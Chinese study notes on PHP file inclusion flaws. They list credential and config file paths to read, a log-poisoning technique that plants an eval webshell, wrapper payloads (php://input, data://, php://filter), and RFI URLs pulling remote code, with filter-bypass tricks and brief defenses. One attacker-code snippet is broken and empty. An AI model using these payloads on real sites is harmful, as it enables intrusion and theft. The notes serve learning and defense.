# File include



参考视频：[Web安全-文件包含漏洞原理与实践 / 黑客入门网络安全](https://www.bilibili.com/video/BV1WV411f7Xf/?share_source=copy_web&vd_source=c3e71390155db06a2adc54171b6c3a0a)

参考文章：[文件包含漏洞全面详解](https://blog.csdn.net/m0_46467017/article/details/126380415?fromshare=blogdetail&sharetype=blogdetail&sharerId=126380415&sharerefer=PC&sharesource=weixin_51334923&sharefrom=from_link)(比较烂)

[一文详解文件包含漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/367359.html)







## 定义

更好地使用代码的重用性



将包含文件设置为变量，用户可以对变量地值可控而对服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞，常见于PHP语言中。



例子：

```php
<?php
    $file=$_GET['file'];
    include($file);
    ?>
```







```php
<?php phpinfo();?>
```



## 漏洞产生函数

文件包含函数

- include
- include_once
- require
- require_once
- highlight_file、show_source、readfile、file_get_contents、fopen、file



函数使用区别：

- require() 找不到被包含的文件会产生致命错误，并且直接停止脚本运行
- include():找不到被包含的文件会发出警告，脚本继续运行



include()函数并不在意被包含的文件是什么类型，只要有php代码，无论是shell.jpg、shell.txt、shell.php、shell.html，都可以被解析







## 漏洞分类

### 本地文件包含LFI

本地文件包含（LFI）打开并包含本地文件

敏感目录：



Windows

```
C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
C:\windows\repair\sam //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
C:\windows\php.ini //php配置信息
```



Linux

```
/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件
```



直接文件上传，就是图片马，一句话木马上传包含的



#### Apache日志文件

已知网站存在文件包含漏洞，可是却没有文件上传点，这时候可以利用Apache的日志文件来生成一句话木马



利用条件：

- 对日志文件可读
- 已知日志文件存储目录





用户发起请求时，服务器将请求写入access.log，当发生错误时将错误写入error.log

要先查看在error.log里面的信息记录格式，才能进行相应的包含

一般来说，目录文件：



```
/var/log/apache/access.log
/var/log/apache2/access.log
/etc/httpd/logs/access.log
```



访问步骤：



先将php代码写入error.log文件中，再进行文件包含，最后用shellcode进行入侵

已知某服务器上可以下面格式进行文件访问，但是不可写入文件



```
http://xxx.xxx.xx.x/name=xxx.txt
```



```
http://xxx.xxx.xx.x/<?php @eval($_POST[123]);?>
```





```
http://xxx.xxx.xx.x/?name=../Apache/logs/error.log
```

提交上述URL的同时，提交POST数据：`123=phpinfo();`



或者可以使用蚁剑进行提交

```
URL：http://192.168.10.150/1.php/?name=../Apache/logs/error.log
连接密码：123
```





#### Nginx日志文件



```
/var/log/nginx/access.log
```



#### IIS日志文件



```
iis6.0版本：
C:\windows\system32\LogFiles

iis7.5版本：
%SystemDrive%\inetpub\logs\LogFiles
```





#### Session文件

Session文件可读写，已知存储路径，最后找到Session内的可控变量



常见存储路径如下：

- /var/lib/php/sess_PHPSESSID
- /var/lib/php/sess_PHPSESSID
- /tmp/sess_PHPSESSID
- /tmp/sessions/sess_PHPSESSID
- session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。
  





#### 临时文件

时间竞争的方式

php上传文件，会创建临时文件，linux下/tmp，Windows下C:\windows\temp 。



暴力破解，或者linux下的随机函数缺陷



配合phpinfo的php variables，直接获取上传文件的存储路径和临时文件名





















### 远程文件包含RFI

远程文件包含（RFI）



`allow_url_fopen`：为ON时，能读取远程文件，例如`file_get_contents()` 就能读取远程文件

`allow_rul_include` ：为ON时，就可使用include和require等方式包含远程文件



当上述两个options都为on时，就可以包含远程文件



使用案例：

攻击者php代码：

记得关防火墙，现在电脑写下面那句话都会弹防火墙：

```
<?php                                                            ?>")?>
```

成功写入包含的话





利用方式：

伪协议包含：

| 协议              | allow_url_open | allow_url_include | 用法                                                         |
| ----------------- | -------------- | ----------------- | ------------------------------------------------------------ |
| file://           | off/on         | off/on            | ?file=file://D:/soft/phpStudy/WWW/phpcode.txt                |
| php://filter      | off/on         | off/on            | ?file=php://filter/read=convert.base64-encode/resource=./index.php |
| php://input       | off/on         | **on**            | ?file=php://input                            【POST DATA】 \<?php phpinfo();?> |
| zip://            | off/on         | off/on            | ?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt      |
| compress.bzip2:// | off/on         | off/on            | ?file=compress.bzip2://./file.bz2                            |
| compress.zlib://  | off/on         | off/on            | ?file=compress.zlib://./file.gz                              |
| data://           | **on**         | **on**            | ?file=data://text/plain,<?php phpinfo();>                    |





data伪协议用法：

?file=data://text/plain,<?php phpinfo();>

?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

?file=data://text/plain,<?php phpinfo();?\>

?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=



php://filter元封装器，设计用于数据流打开时地筛选过滤应用

data://与php://input，可以让用户来控制输入流

php://input访问请求地原始数据地只读流，将POST请求地数据当作php代码执行

phar://xxx.png/shell.php解压缩包地一个函数，不管后缀是什么，都会当作压缩包进行解压





00截断

长度截断（Windows：256，Linux：4096）

日志文件包含

session包含



#### RFI绕过

##### 空字符

%00

```
http://xxx.xxx.xxx.xx/test.php/?name=http://xxx.xxx.xx.x/1.php%00
```



##### 超长字符

./绕过

```
./././././././././././././././././././././././././././././././
```



##### ?绕过

```
http://xxx.xxx.xxx.xx/test.php/?name=http://xxx.xxx.xx.x/1.php?
```



##### 字符编码绕过

| 特殊字符 | 含义                         | 十六进制值 |
| -------- | ---------------------------- | ---------- |
| +        | URL中+号表示空格             | %2B        |
| 空格     | URL中的空格可以用+号或者编码 | %20        |
| /        | 分割目录和子目录             | %2F        |
| ?        | 分割实际的URL和参数          | %3F        |
| %        | 指定特殊字符                 | %25        |
| #        | 表示书签                     | %23        |
| &        | URL中指定的参数间的分隔符    | %26        |
| =        | URL中指定参数的值            | %3D        |



##### #绕过

%23绕过

```
http://xxx.xxx.xxx.xx/test.php/?name=http://xxx.xxx.xx.x/1.php%23
```



##### 空格绕过

%20绕过

```
http://xxx.xxx.xxx.xx/test.php/?name=http://xxx.xxx.xx.x/1.php%20
```



## 文件包含的防御

- PHP使用open_basedir配置限制访问在指定的区域
- 过滤./\
- 禁止服务器远程包含
- 不要使用动态包含，可以在需要包含的页面固定写好



